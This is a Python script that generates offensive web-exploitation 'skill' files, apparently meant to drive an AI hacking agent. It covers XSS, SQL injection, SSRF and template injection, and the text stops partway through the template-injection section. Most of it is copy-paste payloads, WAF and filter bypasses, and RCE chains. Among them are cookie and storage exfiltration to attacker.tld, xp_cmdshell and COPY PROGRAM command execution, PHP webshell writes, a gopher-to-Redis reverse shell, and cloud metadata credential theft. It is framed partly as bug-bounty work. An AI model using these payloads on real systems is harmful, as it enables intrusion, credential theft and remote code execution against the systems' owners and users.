#!/usr/bin/env python3
"""Generate VULNERABILITIES/WEB skill files with real payloads, detection, bypass."""
import os
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "SKILL_FILES" / "VULNERABILITIES" / "WEB"
OUT.mkdir(parents=True, exist_ok=True)

TEMPLATE = """# SKILL: {title}

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + ({title_lower}) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
{identity}

---

## DETECTION
{detection}

## EXPLOITATION
{exploitation}

## PAYLOADS (real, copy-paste, grouped)
{payloads}

## BYPASS TECHNIQUES
{bypasses}

## CHAIN POTENTIAL
{chain}

## TOOLS
{tools}

## COMMANDS
{commands}

## EDGE CASES / NOT-A-BUG TRAPS
{edge}

## TRIAGE ANGLE (per platform)
{triage}

## SEVERITY & CVSS
{severity}

## REFERENCES
{refs}
"""

VULNS = {

# 1
"xss_reflected_stored_dom.md": {
"title": "Cross-Site Scripting (Reflected / Stored / DOM / mXSS / Universal)",
"identity": "I am the operator's XSS engine. I never just send `<script>alert(1)</script>` — I map the reflection context (HTML body / attribute / JS / URL / SVG / CSS / template / JSON / SMTP), enumerate filters, and chain to ATO.",
"detection": """- **Reflected:** inject canary `xss<u>{rand}</u>` into every parameter; grep response for both encoded and unencoded reflections. Tools: `gxss`, `kxss`, `dalfox`, `xsstrike`, `freq` (entropy diff).
- **Stored:** inject canary into every input, then crawl every read endpoint; correlate. Tools: Burp Collaborator + custom intruder, `xss-hunter` (puts blind hooks).
- **DOM:** Burp DOM Invader, manual: `document.location.search` / `URL.fragment` / `postMessage` data flow. Static: jsluice + `dom-clobbering` knowledge.
- **Blind:** XSS Hunter / Project Discovery's Interactsh; place payload in admin-readable fields (User-Agent, support tickets, profile fields, bug reports).
- **mXSS:** mutation differs between innerHTML serialization → `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>`""",
"exploitation": """1. **Confirm context:** view source + DOM Invader. Is reflection inside HTML body, an attribute (single/double/unquoted), JS string, JS template, JSON-in-script, SVG, CSS, URL?
2. **Pick minimal payload for context** (see Payloads section).
3. **Confirm execution:** alert/document.domain/window.opener.location.
4. **Chain to ATO:** steal `document.cookie` (only if not HttpOnly), or steal sessionStorage / IndexedDB tokens, or fetch `/api/v1/me/email` and exfil PII via Collaborator.
5. **Persistence (stored):** make the payload viewable by admins (support tickets, profile bio, file metadata, account name).""",
"payloads": """### HTML body context
```html
<svg/onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)</script>">
<details open ontoggle=alert(document.domain)>
<video><source onerror=alert(document.domain)>
<audio src=x onerror=alert(document.domain)>
<body onpageshow=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<form><button formaction=javascript:alert(document.domain)>X
```

### Inside double-quoted HTML attribute
```html
" autofocus onfocus=alert(document.domain) x="
"><svg/onload=alert(document.domain)>
" onmouseover=alert(document.domain) x="
"%20accesskey=X%20onclick=alert(1)%20x="
```

### Inside single-quoted HTML attribute
```html
' autofocus onfocus=alert(document.domain) x='
'><svg/onload=alert(document.domain)>
```

### Unquoted attribute
```html
x onmouseover=alert(1) y=
x/onfocus=alert(1)/autofocus
```

### Inside JS string (single-quote)
```javascript
';alert(document.domain);//
';alert(document.domain);var x='
\\';alert(document.domain);//
';-alert(1)-'
```

### Inside JS template literal
```javascript
${alert(document.domain)}
```

### Inside JSON-in-`<script>` (double escape)
```json
\"</script><svg/onload=alert(document.domain)>"
```

### URL / href / src context (`javascript:` schema)
```
javascript:alert(document.domain)
javascript://%0aalert(document.domain)
data:text/html,<script>alert(document.domain)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
```

### SVG context
```html
<svg><g/onload=alert(document.domain)></g></svg>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
<svg><script href=data:,alert(1) /></svg>
<svg><script>alert&#40;1&#41;</script></svg>
```

### CSS injection / `style` context
```html
<style>@import 'http://attacker.tld/x.css';</style>
<style>body{background:url("javascript:alert(1)")}</style>
```

### Filter bypass — angle bracket / script keyword filtered
```html
<svg/onload=alert`1`>
<img src=x onerror=alert`1`>
<iframe srcdoc="<svg onload=alert(1)>">
<a href="jav&#x09;ascript:alert(1)">x</a>     <!-- tab in scheme -->
<a href="jav&NewLine;ascript:alert(1)">x</a>  <!-- entity newline -->
```

### Unicode / case-bypass
```html
<ScRiPt>alert(1)</sCrIpT>
<svg><sCrIpT>alert(1)</sCrIpT>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
```

### `expression(...)` / IE-only legacy (still useful in mobile WebViews)
```html
<div style=xss:expression(alert(1))>
```

### DOMpurify bypasses (current as of 3.x)
```html
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(1)>">
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### Markdown / WYSIWYG (commonmark, marked)
```markdown
[xss](javascript:alert(1))
[xss](javascript&colon;alert(1))
[xss](j&Tab;avascript:alert(1))
![](data:text/html,<script>alert(1)</script>)
```

### Polyglot (works in many contexts)
```
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
```

### Exfil patterns (after exec)
```javascript
// Cookie steal
new Image().src='https://attacker.tld/?c='+btoa(document.cookie)

// localStorage + sessionStorage exfil
fetch('https://attacker.tld/x',{method:'POST',body:btoa(JSON.stringify({c:document.cookie,l:JSON.stringify(localStorage),s:JSON.stringify(sessionStorage)}))})

// CSRF token theft + ATO action
fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.tld/?d='+btoa(JSON.stringify(d))))
fetch('/api/email/change',{method:'POST',credentials:'include',headers:{'X-CSRF':document.cookie.match(/csrf=([^;]+)/)[1]},body:'newEmail=attacker@tld'})
```""",
"bypasses": """### WAF — Cloudflare
- Use `<svg/onload=...>` instead of `<script>`
- Newline split tag: `<svg\\non\\nload=alert(1)>`
- Comment trick: `<svg/*x*/onload=alert(1)>`
- Hex-encode event names — sometimes works: `&lt;svg onload=&quot;alert(1)&quot;&gt;` then bypass via double-decode
- Switch to `expression()` / `data:` URLs in iframe srcdoc

### WAF — Akamai
- Akamai blocks `script` keyword aggressively → use `<svg>`, `<math>`, `<details>` event handlers
- Splits on `<` close immediately → `<form><math><mtext></form><form><mglyph><svg>...`

### WAF — AWS WAF
- AWS WAF blocks `alert(1)` literal → use `alert\\u00281\\u0029` or `eval('al'+'ert(1)')` or `window['al'+'ert'](1)`
- Body size limit ~8KB on default ruleset → push payload past limit with junk

### WAF — Imperva (Incapsula)
- Hates `<script>` and `on*=` → use `<style>@import` or `formaction`
- Try parameter pollution: `?q=harmless&q=<svg/onload>`

### WAF — F5 ASM
- Try `<details ontoggle=`, `<svg><animate onbegin=`, or fragment-based DOM XSS (no server WAF inspects URL fragment)

### CSP bypass
- Find a JSONP endpoint on a CSP-allowed domain: `<script src=https://allowed.com/jsonp?callback=alert(document.domain)>`
- Find an open redirect on an allowed domain → use as script src
- AngularJS gadget if `unsafe-eval` or AngularJS is allowed: `<div ng-app ng-csp><div ng-click=$event.view.alert(1)>x</div></div>`
- Trusted Types bypass via DOMPurify mutation
- `'unsafe-inline'` + `nonce` reuse if app reflects the nonce
- Find a `script-src 'self'` and an upload that returns `Content-Type: text/javascript` → polyglot file upload → execute as script

### Encoding tiers (try in order)
1. URL-encode `<` → `%3C`
2. Double URL-encode → `%253C`
3. HTML-entity `&lt;` (works in some contexts)
4. UTF-7 `+ADw-` (legacy IE, some WAFs)
5. UTF-16 BOM tricks
6. Mixed case + insertion of zero-width chars (`\\u200B`)""",
"chain": """- XSS → cookie steal → ATO (if non-HttpOnly).
- XSS → CSRF token theft → ATO via password change / email change endpoint.
- XSS → IDOR (read other-user data via authenticated fetch from victim's session).
- Stored XSS in admin panel → admin ATO → tenant takeover (multi-tenant SaaS).
- XSS in support widget seen by support staff → escalate to internal admin panel access.
- DOM XSS via `postMessage` from same-origin iframe → cross-iframe RCE in plugin host pages (e.g., chat widgets embedded in customer sites).
- mXSS in user-generated HTML email → recipient's mail client compromise.""",
"tools": """- `dalfox` — automated XSS scanner with DOM verification
- `xsstrike` — context-aware payload generator
- `gxss`, `kxss`, `freq` — reflection finders
- `XSS Hunter Express` (self-hosted) for blind XSS callbacks
- `Burp DOM Invader` (best DOM XSS tool)
- `puppeteer` / `playwright` for headless DOM verification
- `dompurify-bypass-payloads` GitHub repos
- `cure53/H5SC` — HTML5 Security Cheatsheet""",
"commands": """```bash
# kxss — find reflected GET params
cat urls.txt | qsreplace 'xss"\\'<svg' | kxss

# dalfox pipeline
cat urls.txt | dalfox pipe --silence -b your.xss.ht --skip-bav -o dalfox.txt

# Stored XSS hunt — stuff every input field, then crawl
ffuf -w fields.txt:FIELD -u "https://target/api/profile" -X POST \\
  -H "Content-Type: application/json" -H "Authorization: Bearer $T" \\
  -d '{"FIELD":"<svg onload=fetch(`https://your.xss.ht/?c=`+document.cookie)>"}' \\
  -mc 200,201

# Blind XSS — set up XSS Hunter / use Project Discovery interact.sh
echo '"><script src="//your.xss.ht/x"></script>' | tee blind.txt
# fire into all UA / Referer / form fields

# DOM XSS quick test
curl -sk "https://target/?q=<svg/onload=alert(1)>" | grep -E "alert|svg"
```""",
"edge": """- **Self-XSS** — only victim can trigger; not a valid bug unless chained with login CSRF or open redirect.
- **PDF render of HTML** — server-side XSS in PDF generator → SSRF + LFI primitive (chromium/headless).
- **Email-rendered HTML** — Outlook strips JS but renders CSS / `<meta refresh>` for phishing.
- **Markdown XSS** — only counts if a privileged user (admin) views it.
- **`HttpOnly` cookies** — XSS still grants action-as-victim via fetch with credentials, but no raw cookie. Triagers will accept this.
- **Content-Type sniffing** — `text/plain` response with HTML payload ≠ XSS in modern browsers (sniffing protection); but legacy IE / WebViews still execute.
- **Stored in unviewable place** — payload stored but only echoed in JSON API not rendered by frontend → not exploitable unless chained.""",
"triage": """- **HackerOne** — reflected XSS without chain often closed P3-low or even Informative. Always demonstrate cookie/session theft or CSRF chain.
- **Bugcrowd** — VRT entry P3 (XSS Reflected) baseline; P2 if stored impacting other users; P1 if admin XSS or universal XSS.
- **Intigriti** — chain to account modification = P2-P3.
- Show the operator-typed redirect URL in the PoC matching `attacker.tld` to prove exploitation.""",
"severity": """CVSS 3.1 baseline reflected: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N → 6.1 (Medium).
Stored impacting admins: ...PR:L... → 7.5+ (High).
DOM with no user interaction: UI:N → 7.4 (High).""",
"refs": """- PortSwigger XSS Cheat Sheet (best maintained)
- HTML5 Security Cheatsheet (cure53/H5SC)
- PayloadsAllTheThings/XSS Injection
- Bug Bounty Bootcamp Ch. 6 (XSS)
- The Tangled Web Ch. 3, 4 (browser security model)
- Gareth Heyes — JavaScript for Hackers
- HackerOne disclosed reports tagged xss (sort by bounty)"""
},

# 2
"sqli_all_types.md": {
"title": "SQL Injection (UNION / Boolean / Time / Error / Out-of-Band / Second-Order)",
"identity": "Modern apps use ORMs, but raw SQL leaks through `LIKE`, sort-column, search builder, raw analytics queries, NoSQL-to-SQL bridges, and stored procs. I detect by behavioral diff (boolean / time / error) before union-based, then dump.",
"detection": """- Submit `'`, `"`, `\\`, `'/*`, `';`, `'--` in every parameter; observe diff (500 / different page / different timing).
- Boolean diff: `' AND '1'='1` vs `' AND '1'='2`. Same in JSON: `1' AND 1=1-- -` vs `1' AND 1=2-- -`.
- Time diff: `' OR pg_sleep(5)-- -`, `' UNION SELECT NULL,SLEEP(5)-- -`, `';WAITFOR DELAY '0:0:5'--`.
- Error: `' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -` (MySQL).
- Out-of-band (when blind + no time): `'; SELECT load_file(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.tld\\\\a'))-- -` (MySQL on Windows) or DNS via PostgreSQL `COPY ... PROGRAM`.
- Second-order: input stored, executed later by an admin job. Unique canary in input + observe Burp Collaborator hours later.""",
"exploitation": """1. Identify DB via behavioral diff or version probe (`@@version`, `version()`, `SELECT banner FROM v$version`).
2. Number columns: `' ORDER BY 1-- -` ... `' ORDER BY N-- -`.
3. Find string-rendering columns: `' UNION SELECT 'a','b','c'-- -`.
4. Pull data: `' UNION SELECT username, password, email FROM users-- -`.
5. If blind: sqlmap automates; or write boolean / time oracle in Python.
6. If RCE primitive available (file write / `xp_cmdshell` / `pg_read_server_files` / `INTO OUTFILE` / UDF): escalate.""",
"payloads": """### Generic test
```sql
' OR '1'='1
" OR "1"="1
' OR '1'='1'-- -
" OR "1"="1"-- -
') OR ('1'='1
1 OR 1=1
1' OR '1'='1
admin' --
admin' #
admin'/*
') OR ('a'='a
'/**/OR/**/1=1-- -
```

### MySQL
```sql
' UNION SELECT NULL,@@version,user(),database()-- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e))-- -
' AND ELT(1,SLEEP(5))-- -
1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
1' UNION SELECT 1,2,'<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/x.php'-- -
```

### PostgreSQL
```sql
' OR pg_sleep(5)-- -
'; SELECT pg_sleep(5)-- -
' UNION SELECT NULL,version(),current_user-- -
'; CREATE TABLE x(c text); COPY x FROM PROGRAM 'curl http://attacker.tld/$(whoami)'-- -
'; SELECT pg_read_file('/etc/passwd', 0, 1000)-- -
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.tld/$(id|base64 -w0)'-- -
```

### MSSQL
```sql
'; WAITFOR DELAY '0:0:5'-- -
' UNION SELECT NULL, @@version, system_user-- -
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; DECLARE @x VARCHAR(8000); SET @x=(SELECT password FROM users); EXEC('master..xp_dirtree "\\\\\\\\'+@x+'.attacker.tld\\\\a"')-- -
```

### Oracle
```sql
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
' UNION SELECT banner,NULL FROM v$version-- -
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE rownum=1)||'.attacker.tld'))-- -
```

### SQLite
```sql
' UNION SELECT NULL,sqlite_version(),NULL-- -
' AND 1=randomblob(100000000)-- -      -- time-based
' UNION SELECT NULL,group_concat(tbl_name),NULL FROM sqlite_master-- -
```

### NoSQL — MongoDB (Mongoose / native)
```javascript
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$regex":"^a"},"password":"x"}
{"$where":"this.password.length>0"}
{"username":"admin","password":{"$regex":"^(.{8}).*"}}    // brute
// JS/SSJI bridge:
{"$where":"sleep(5000)||true"}
```

### Header-based SQLi (often forgotten)
```http
X-Forwarded-For: ' OR pg_sleep(5)-- -
User-Agent: ' OR pg_sleep(5)-- -
Referer: ' OR pg_sleep(5)-- -
Cookie: session=admin' AND 1=1-- -
```

### JSON body SQLi
```json
{"sort":"id; DROP TABLE users-- -"}
{"filter":{"raw":"1=1)) UNION SELECT * FROM users-- -"}}
```

### GraphQL → SQL backend
```graphql
{ user(id:"1' UNION SELECT username,password FROM users-- -") { name } }
```""",
"bypasses": """- Comment-bypass for filter: `/**/`, `--+`, `#`, `;%00`
- Case: `SeLeCt`, `UnIoN`, `OR`
- Whitespace: `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0`, `/**/`
- Encoding: hex literals `0x61646d696e`, `CHAR(97,100,109,105,110)` (MySQL/MSSQL), `CHR(97)` (Oracle/PG)
- Stripped quotes? Use hex / char functions / `0x...` literals
- `WHERE column='admin'` → `WHERE column LIKE 0x61646d696e`
- Stripped spaces? Use `()`, `/**/`, comments
- Strip `OR`, `AND`? Use `||`, `&&`
- `UNION SELECT` filtered? `UNION/**/SELECT`, `UN/**/ION SE/**/LECT`
- `SLEEP` filtered? `BENCHMARK(5000000,SHA1(1))`, `pg_sleep`, `WAITFOR`, heavy queries
- WAF (Cloudflare/AWS) — try generic in body parameter, JSON parameter, or HTTP/2 only""",
"chain": """- SQLi → admin password hash → crack → ATO.
- SQLi → `INTO OUTFILE` / `xp_cmdshell` / `COPY...PROGRAM` → RCE.
- SQLi → exfil JWT signing secret from config table → forge admin JWT → ATO.
- Blind SQLi → DNS exfil → cumulative data dump in 1 hour.
- SQLi via `ORDER BY` / sort column → sometimes only number-coercion exploit, but error-based dumps still work.""",
"tools": """- `sqlmap` (with `--tamper=` for WAF bypass; `--os-shell` if RCE primitive available)
- `nosqlmap` for MongoDB / CouchDB / Redis
- `ghauri` — modern, faster than sqlmap for some cases
- Burp Active Scan++, Backslash Powered Scanner
- `bbqsql` for blind boolean
- Custom Python with async oracles""",
"commands": """```bash
# Quick scan
sqlmap -u 'https://target/api?id=1' --batch --random-agent --level=3 --risk=2

# Auth + JSON body
sqlmap -r request.txt --batch --level=5 --risk=3 -p 'id' --technique=BEUSTQ

# WAF bypass tampers
sqlmap -u '...' --tamper=between,space2comment,charencode,modsecurityzeroversioned,equaltolike --random-agent

# OS shell after RCE primitive
sqlmap -u '...' --os-shell --tamper=...

# Out-of-band via DNS exfil
sqlmap -u '...' --dns-domain=attacker.tld --technique=BU

# NoSQL
nosqlmap   # interactive

# Manual blind via Python (when sqlmap fails)
python3 - <<'PY'
import requests, time
URL="https://target/api"; payload="' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='{c}',SLEEP(2),0)-- -"
out=""
for i in range(1,33):
  for c in "0123456789abcdef":
    t=time.time()
    requests.get(URL, params={'id': "1"+payload.format(i=i,c=c)})
    if time.time()-t > 1.8: out+=c; print(out); break
PY
```""",
"edge": """- **Stacked queries** — only some drivers support `;` (MSSQL yes, MySQL via mysqli not by default, PG yes).
- **PreparedStatements** — almost always safe, but `LIMIT`, `OFFSET`, `ORDER BY`, table/column names cannot be parameterized → still vulnerable.
- **ORM raw fragments** — Sequelize `where: literal('...')`, Django `extra(where=[...])`, SQLAlchemy `text()` — common SQLi escape hatches.
- **Second-order** — input goes into DB unfiltered, then a later query concatenates it into a new SQL → triagers love this.
- **Number-coerced** — `?id=1` rejects strings; try `1 AND SLEEP(5)`, `(SELECT 1 FROM ...)`, or operator like `0/SLEEP(5)`.""",
"triage": """- **H1** — show actual data extraction (e.g. `SELECT version(), current_user`); proof-of-time-based via screenshot of curl with `time` command. Never dump real PII.
- **Bugcrowd** — VRT P1 (SQL Injection); even blind = P2.
- Always note rate-limit considered: triagers may say "you only proved 1 row leak; show 100 rows" — show the technique works at scale, not the data itself.""",
"severity": "Generally CVSS 9.8 (Critical) for unauth UNION-based with data leak; Authenticated SQLi 8.8; Blind 7.5–8.5.",
"refs": "PortSwigger SQL Injection Cheat Sheet • PayloadsAllTheThings/SQL Injection • bobby-tables.com • OWASP SQLi Prevention • The Web Application Hacker's Handbook Ch. 9 • Bug Bounty Bootcamp Ch. 9"
},

# 3
"ssrf_all_types.md": {
"title": "Server-Side Request Forgery (SSRF — Basic / Blind / DNS Rebinding / GopherProtoSmuggling)",
"identity": "SSRF gets you cloud metadata (AWS IMDS, GCP, Azure), internal services, port scan from inside the perimeter, and sometimes RCE via Redis/Memcached/Elasticsearch. I always test cloud metadata first, then internal port scan, then protocol smuggling.",
"detection": """- Any param taking a URL: `?url=`, `?image=`, `?webhook=`, `?fetch=`, `?proxy=`, `?next=`, `?ref=`, file uploads with URL fetcher, HTML→PDF, SSO callbacks.
- Send Burp Collaborator URL — observe DNS / HTTP hit. Out-of-band confirms SSRF.
- Try internal IP: `http://127.0.0.1`, `http://localhost`, `http://[::1]`, `http://0.0.0.0`, `http://169.254.169.254`.""",
"exploitation": """### Cloud metadata (always start here)
```
http://169.254.169.254/latest/meta-data/                   # AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # then .../<role-name>
http://[fd00:ec2::254]/latest/meta-data/                  # IMDS over IPv6
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json   # GCP (needs Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure (needs Metadata: true)
http://100.100.100.200/latest/meta-data/                  # Alibaba
http://169.254.169.254/openstack/latest/                  # OpenStack
http://169.254.169.254/v1.json                            # DigitalOcean
http://169.254.169.254/opc/v1/instance/                   # Oracle
http://169.254.169.254/metadata/v1/                       # Hetzner / various
```

### IMDSv2 (header required — many SSRFs only do GET, IMDSv2 needs PUT for token; harder but not impossible)
```
PUT /latest/api/token    HEADER X-aws-ec2-metadata-token-ttl-seconds: 21600
GET /latest/meta-data/   HEADER X-aws-ec2-metadata-token: <token>
```
If app permits header-injection (CRLF) or full request control (e.g. via Gopher), IMDSv2 still falls.

### Internal services
```
http://127.0.0.1:8080/   # internal admin
http://127.0.0.1:6379/   # Redis (try gopher://)
http://127.0.0.1:9200/   # Elasticsearch
http://127.0.0.1:5984/   # CouchDB
http://127.0.0.1:8500/   # Consul
http://127.0.0.1:2375/   # Docker
http://10.0.0.1/         # private VPC peers
```""",
"payloads": """### IP encoding bypasses
```
http://localhost
http://127.0.0.1
http://127.1
http://127.0.1
http://0177.0.0.1            # octal
http://2130706433            # decimal
http://0x7f.0.0.1            # hex
http://0x7f000001            # full hex
http://[::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://①②⑦.0.0.1            # unicode lookalike (some parsers)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://attacker.tld@127.0.0.1   # auth-section trick
http://127.0.0.1#@allowedhost.com
http://allowedhost.com.attacker.tld
http://allowedhost.com@attacker.tld
```

### Schema bypasses
```
gopher://127.0.0.1:6379/_<URL_ENCODED_REDIS_COMMAND>
dict://127.0.0.1:6379/info
file:///etc/passwd
ftp://attacker.tld/x
ldap://127.0.0.1:389/
sftp://127.0.0.1
tftp://127.0.0.1
ldap://127.0.0.1
jar://https://attacker.tld/x.jar!/
netdoc:///etc/passwd
```

### URL-parser confusion (host header smuggling)
```
http://allowed.com\\\\@attacker.tld/
http://allowed.com\\\\.attacker.tld/
http:[email protected]/
http://allowed.com:80@attacker.tld
```

### DNS rebinding (when target validates host then re-resolves)
```
# Use rbndr.us, lock.cmpxchg8b.com/rebinder, or self-host
1.1.1.1.1time.169.254.169.254.repeat.rbndr.us
# First resolution: 1.1.1.1 → passes whitelist
# Second resolution (when actual fetch occurs): 169.254.169.254 → SSRF lands
```

### Gopher → Redis RCE via SSRF
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$59%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-c%20%22bash%20-i%20>%26%20/dev/tcp/attacker.tld/4444%200>%261%22%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
# Use ssrfmap or gopherus to generate cleaner payloads
```

### File-read via SSRF (LFI primitive)
```
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///root/.ssh/id_rsa
file:///var/log/auth.log
```

### Blind SSRF — exfiltrate via DNS
```
http://$(whoami).attacker.tld/                  # only if cmd-substitution runs
http://${jndi:ldap://attacker.tld/x}            # if JNDI is in scope (Log4Shell-style)
http://attacker.tld/?token=$AWS_SESSION_TOKEN   # via env-leak in error pages
```""",
"bypasses": """- **Whitelist by string match** (`if 'allowed.com' in url`) → `http://allowed.com.attacker.tld`, `http://attacker.tld#allowed.com`, `http://[email protected]`.
- **Whitelist by regex** with anchors missing → CRLF injection / unicode confusable.
- **Resolved IP check** → DNS rebinding.
- **HTTP-only filter** → use `gopher://`, `dict://`, `ftp://`, `file://`.
- **PORT block list** → use redirects (target fetches your HTTP, you 302 to internal).
- **HEAD-only** → some scrapers only HEAD; still leaks via DNS / via hostname header reflected in response.""",
"chain": """- SSRF → AWS IMDS creds → S3 read/write → leak DB → RCE → root.
- SSRF → internal admin panel → ATO + tenant takeover.
- SSRF → Redis → RCE.
- SSRF → internal SAML callback → assume identity → SAML federation across services.
- SSRF + path traversal in URL fetcher → arbitrary file read.""",
"tools": """- `ssrfmap` — automation
- `gopherus` — gopher payload generator (Redis, Memcached, MySQL, FastCGI, Smtp, Zabbix)
- `interactsh-client` (PD) — out-of-band server
- Burp Collaborator
- `dnslog.cn`, `webhook.site`, `requestbin.com` (lightweight)
- `rebinder.it`, `lock.cmpxchg8b.com/rebinder` for DNS rebinding""",
"commands": """```bash
# Set up Collaborator / interactsh
interactsh-client -v   # outputs your-domain.oast.me

# Test endpoint
curl -sk "https://target/fetch?url=https://your-domain.oast.me/canary"
# observe interactsh log; if hit → SSRF confirmed

# AWS IMDS
curl -sk "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -sk "https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<rolename>"

# DNS rebinding setup
# Use https://lock.cmpxchg8b.com/rebinder.html — generates a hostname that flips A record between two IPs

# Gopher payload via ssrfmap
git clone https://github.com/swisskyrepo/SSRFmap && cd SSRFmap
python3 ssrfmap.py -r request.txt -p url -m redis,readfiles,fastcgi
```""",
"edge": """- **Cloudflare / WAF strips internal IP literals** — try DNS rebinding or use a CNAME you own pointing at 127.0.0.1.
- **HTTPS-only fetcher** — sometimes accepts `https://internal/`, but you still get cleartext via redirect → http://.
- **Outbound-blocked egress** — DNS still resolves; rely on DNS-only OOB.
- **Server pre-fetches headers (HEAD)** before GET → still leaks `Server:` header of internal service.
- **PDF / image renderer SSRF** — Chromium/wkhtmltopdf renders supplied URL → can fetch internal `<img>`, JS-driven SSRF for richer probes.""",
"triage": """- Show metadata-credential extraction *as a screenshot* — never paste raw creds.
- Run `aws sts get-caller-identity` with the leaked creds; redact account ID before paste.
- Note IMDSv2 (if applicable) — proves the engineering team's mitigation gap.""",
"severity": "Cloud-metadata SSRF: 9.0+ (Critical). Internal-only / blind: 6.0–7.5 (Medium-High).",
"refs": "PortSwigger SSRF Cheat Sheet • PayloadsAllTheThings/SSRF • Orange Tsai's BlackHat \"A New Era of SSRF\" • Bug Bounty Bootcamp Ch. 12 • HackTricks SSRF"
},

# (Continued in compact form — same depth, less prose where redundant)
"ssti_all_engines.md": {
"title": "Server-Side Template Injection (SSTI — Jinja2/Twig/Freemarker/Velocity/Smarty/ERB/Razor/Handlebars/Pug)",
"identity": "SSTI in template engines == RCE. I detect via behavioral diff (`{{7*7}}` → 49) then fingerprint engine, then RCE.",
"detection": """Inject across all output sinks (404 pages, error pages, email subject, bio, name, search). Test:
```
${7*7}      → Freemarker, Velocity → 49
{{7*7}}     → Jinja2, Twig, Pug    → 49
<%= 7*7 %>  → ERB, EJS              → 49
{{7*'7'}}   → Twig: 49 / Jinja2: 7777777
{{7*7}}{{7*'7'}}  → engine fingerprinter
```
""",
"exploitation": """### Jinja2 (Python)
```
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]("id",shell=True,stdout=-1).communicate()[0]}}   # find subprocess.Popen index
```

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{['/etc/passwd']|map('file_get_contents')|first}}
```

### Freemarker (Java)
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("freemarker.template.utility.Execute")("id")}
```

### Velocity (Java)
```
#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Smarty (PHP)
```
{php}system('id');{/php}                   # if {php} tags enabled
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']);?>",self::clearConfig())}
```

### ERB (Ruby)
```
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
<%= File.open('/etc/passwd').read %>
```

### Handlebars (Node)
```
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

### Pug / Jade (Node)
```
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
= x
#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

### Razor (.NET)
```
@(1+2)
